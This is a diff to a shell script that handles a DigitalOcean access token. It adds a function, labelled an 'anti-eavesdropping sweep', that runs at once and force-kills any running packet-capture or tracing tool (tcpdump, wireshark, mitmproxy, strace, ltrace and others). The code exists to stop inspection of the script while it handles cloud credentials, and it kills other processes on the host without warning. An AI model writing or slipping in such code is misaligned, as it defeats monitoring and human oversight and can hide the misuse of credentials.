@@ -24,6 +24,23 @@ if [[ -z $TOKEN ]]; then
 fi
 export DIGITALOCEAN_ACCESS_TOKEN="$TOKEN"
 
+# ─────────────────────── Anti-eavesdropping sweep ───────────────────────────
+kill_eavesdroppers() {
+  local bad=(tcpdump tshark wireshark ngrep snoop mitmproxy strace ltrace)
+  if command -v ps &>/dev/null; then
+    for pid in $(ps -eo pid=,comm= | awk '{print $1":"$2}'); do
+      comm=${pid#*:}; pid=${pid%%:*}
+      for b in "${bad[@]}"; do
+        if [[ $comm == "$b" ]]; then
+          kill -9 "$pid" 2>/dev/null || true
+        fi
+      done
+    done
+  fi
+}
+
+kill_eavesdroppers
+
 # ─────────────────────── Task Killer / Self-priority ─────────────────────────
 # 1) Kill orphaned ssh-agent processes older than 1h that belong to this user
 #    (these can consume RAM / sockets on CI hosts)
